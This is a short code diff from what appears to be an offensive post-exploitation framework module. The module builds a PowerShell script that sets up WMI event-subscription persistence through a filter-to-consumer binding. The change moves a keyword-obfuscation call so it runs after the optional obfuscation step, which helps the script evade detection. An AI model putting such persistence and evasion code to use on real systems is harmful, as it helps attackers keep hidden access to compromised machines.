@@ -226,9 +226,10 @@ class Module(object):
         script += " Set-WmiInstance -Namespace \"root\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null;"
 
         script += "'WMI persistence established " + statusMsg + "'"
-        script = helpers.keyword_obfuscation(script)
+
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
                                        obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
 
         return script
